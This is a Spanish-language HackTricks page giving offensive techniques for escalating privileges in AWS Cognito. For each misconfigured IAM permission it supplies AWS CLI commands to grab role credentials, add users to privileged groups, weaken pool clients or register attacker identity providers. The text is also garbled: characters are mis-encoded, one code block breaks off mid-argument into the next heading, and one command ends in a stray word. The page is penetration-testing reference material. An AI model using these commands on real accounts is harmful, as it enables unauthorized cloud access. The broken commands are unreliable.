# AWS - Cognito Privesc

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Cognito

Para obtener m谩s informaci贸n sobre Cognito, consulte:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Recopilaci贸n de credenciales de Identity Pool

Como Cognito puede otorgar credenciales de **roles IAM** tanto a usuarios **autenticados** como **no autenticados**, si localiza el **ID de Identity Pool** de una aplicaci贸n (deber铆a estar codificado en ella) puede obtener nuevas credenciales y, por lo tanto, privesc (dentro de una cuenta de AWS donde probablemente ni siquiera ten铆a ninguna credencial anteriormente).

Para obtener m谩s informaci贸n, [**consulte esta p谩gina**](../aws-unauthenticated-enum-access/#cognito).

**Impacto potencial:** Privesc directo al rol de servicios adjunto a los usuarios no autenticados (y probablemente al adjunto a los usuarios autenticados).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Con este permiso, puede **conceder cualquier rol de cognito** a los usuarios autenticados / no autenticados de la aplicaci贸n cognito.

```bash
aws cognito-identity set-identity-pool-roles \
    --identity-pool-id <identity_pool_id> \
    --roles unauthenticated=<role ARN>

# Obtener credenciales
## Obtener un ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Obtener credenciales para ese ID
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```

Si la aplicaci贸n cognito **no tiene usuarios no autenticados habilitados**, es posible que tambi茅n necesite el permiso `cognito-identity:UpdateIdentityPool` para habilitarlo.

**Impacto potencial:** Privesc directo a cualquier rol de cognito.

### `cognito-identity:update-identity-pool`

Un atacante con este permiso podr铆a establecer, por ejemplo, un grupo de usuarios de Cognito bajo su control o cualquier otro proveedor de identidad donde pueda iniciar sesi贸n como **forma de acceder a este Identity Pool de Cognito**. Luego, simplemente **iniciar sesi贸n** en ese proveedor de usuarios permitir谩 que acceda al rol autenticado configurado en el Identity Pool.

```bash
# Este ejemplo utiliza un grupo de usuarios de Cognito como proveedor de identidad
## pero podr铆a usar cualquier otro proveedor de identidad
aws cognito-identity update-identity-pool \
    --identity-pool-id <value> \
    --identity-pool-name <value> \
    [--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
    --cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Ahora debe iniciar sesi贸n en el User Pool que ha configurado
## despu茅s de tener el token de ID del inicio de sesi贸n, contin煤e con los siguientes comandos:

# En este paso, ya deber铆a tener un token de ID
aws cognito-identity get-id \
    --identity-pool-id <id_pool_id> \
    --logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Obtener el identity_id de la respuesta del comando anterior
aws cognito-identity get-credentials-for-identity \
    --identity-id <identity_id> \
    --logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```

Tambi茅n es posible **abusar de este permiso para permitir la autenticaci贸n b谩sica**:

```bash
aws cognito-identity update-identity-pool \
    --identity-pool-id <value> \
    --identity-pool-name <value> \
    --allow-unauthenticated-identities
    --allow-classic-flow
```

**Impacto potencial**: Compromiso del rol IAM autenticado configurado dentro del pool de identidades.

### `cognito-idp:AdminAddUserToGroup`

Este permiso permite **agregar un usuario de Cognito a un grupo de Cognito**, por lo tanto, un atacante podr铆a abusar de este permiso para agregar un usuario bajo su control a otros grupos con privilegios **mejores** o **diferentes roles IAM**:

```bash
aws cognito-idp admin-add-user-to-group \
    --user-pool-id <value> \
    --username <value> \
    --group-name <value>
```

**Impacto potencial:** Privesc a otros grupos de Cognito y roles IAM adjuntos a los grupos de User Pool.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Un atacante con estos permisos podr铆a **crear / actualizar grupos** con **cada rol IAM que pueda ser utilizado por un proveedor de identidad de Cognito comprometido** y hacer que un usuario comprometido forme parte del grupo, accediendo a todos esos roles:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Impacto potencial:** Privesc a otros roles IAM de Cognito.

### `cognito-idp:AdminConfirmSignUp`

Este permiso permite **verificar un registro**. Por defecto, cualquier persona puede iniciar sesi贸n en aplicaciones Cognito, si se deja as铆, un usuario podr铆a crear una cuenta con cualquier dato y verificarla con este permiso.

```bash
aws cognito-idp admin-confirm-sign-up \
    --user-pool-id <
### `cognito-idp:AdminUpdateUserAttributes`

Un atacante con este permiso podr铆a cambiar el correo electr贸nico o el n煤mero de tel茅fono o cualquier otro atributo de un usuario bajo su control para intentar obtener m谩s privilegios en una aplicaci贸n subyacente. Esto permite cambiar un correo electr贸nico o n煤mero de tel茅fono y establecerlo como verificado.

```bash
aws cognito-idp admin-update-user-attributes \
    --user-pool-id <value> \
    --username <value> \
    --user-attributes <value>
```

**Impacto potencial:** Posible escalada indirecta de privilegios en la aplicaci贸n subyacente que utiliza Cognito User Pool y que otorga privilegios en funci贸n de los atributos del usuario.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Un atacante con este permiso podr铆a **crear un nuevo cliente de User Pool menos restringido** que los clientes de pool existentes. Por ejemplo, el nuevo cliente podr铆a permitir cualquier tipo de m茅todo de autenticaci贸n, no tener ning煤n secreto, tener la revocaci贸n de tokens desactivada, permitir que los tokens sean v谩lidos por un per铆odo m谩s largo...

Lo mismo se puede hacer si en lugar de crear un nuevo cliente, se **modifica uno existente**.

En la [**l铆nea de comando**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (o en la [**de actualizaci贸n**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) se pueden ver todas las opciones, 隆compru茅balo!.

```bash
aws cognito-idp create-user-pool-client \
    --user-pool-id <value> \
    --client-name <value> \
    [...]
```

**Impacto potencial:** Posible escalada indirecta de privilegios al usuario autorizado de Identity Pool utilizado por User Pool mediante la creaci贸n de un nuevo cliente que relaje las medidas de seguridad y permita que un atacante inicie sesi贸n con un usuario que pudo crear.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Un atacante podr铆a abusar de este permiso para crear usuarios cargando un archivo csv con nuevos usuarios.

```bash
# Crear un nuevo trabajo de importaci贸n
aws cognito-idp create-user-import-job \
    --job-name <value> \
    --user-pool-id <value> \
    --cloud-watch-logs-role-arn <value>

# Usar un nuevo trabajo de importaci贸n
aws cognito-idp start-user-import-job \
    --user-pool-id <value> \
    --job-id <value>

# Ambas opciones anteriores le dar谩n una URL donde puede enviar el archivo CVS con los usuarios a crear
curl -v -T "PATH_TO_CSV_FILE" \
    -H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```

(En el caso de que cree un nuevo trabajo de importaci贸n, es posible que tambi茅n necesite el permiso de iam passrole, a煤n no lo he probado).

**Impacto potencial:** Escalada directa de privilegios al rol IAM de la pool de identidades para usuarios autenticados. Escalada indirecta a otras funcionalidades de la aplicaci贸n al poder crear cualquier usuario.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Un atacante podr铆a crear un nuevo proveedor de identidad para luego poder **iniciar sesi贸n a trav茅s de este proveedor**.

```bash
aws cognito-idp create-identity-provider \
    --user-pool-id <value> \
    --provider-name <value> \
    --provider-type <value> \
    --provider-details <value> \
    [--attribute-mapping <value>] \
    [--idp-identifiers <value>]
```

**Impacto potencial:** Escalada directa de privilegios al rol IAM de la pool de identidades para usuarios autenticados. Escalada indirecta a otras funcionalidades de la aplicaci贸n al poder crear cualquier usuario.

### cognito-sync:\* An谩lisis

Este es un permiso muy com煤n por defecto en los roles de Cognito Identity Pools. Incluso si un comod铆n en un permiso siempre parece malo (especialmente viniendo de AWS), los **permisos dados no son muy 煤tiles desde la perspectiva de un atacante**.

Este permiso permite leer la informaci贸n de uso de Identity Pools e Identity IDs dentro de Identity Pools (que no es informaci贸n sensible).\
Los Identity IDs pueden tener [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) asignados a ellos, que son informaci贸n de las sesiones (AWS lo define como un **juego guardado**). Es posible que esto contenga alg煤n tipo de informaci贸n sensible (pero la probabilidad es bastante baja). Puede encontrar en la [**p谩gina de enumeraci贸n**](../aws-services/aws-cognito-enum/) c贸mo acceder a esta informaci贸n.

Un atacante tambi茅n podr铆a usar estos permisos para **inscribirse en un flujo de Cognito que publique cambios** en estos datasets o un **lambda que se active en eventos de cognito**. No he visto que esto se use, y no esperar铆a informaci贸n sensible aqu铆, pero no es imposible.

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>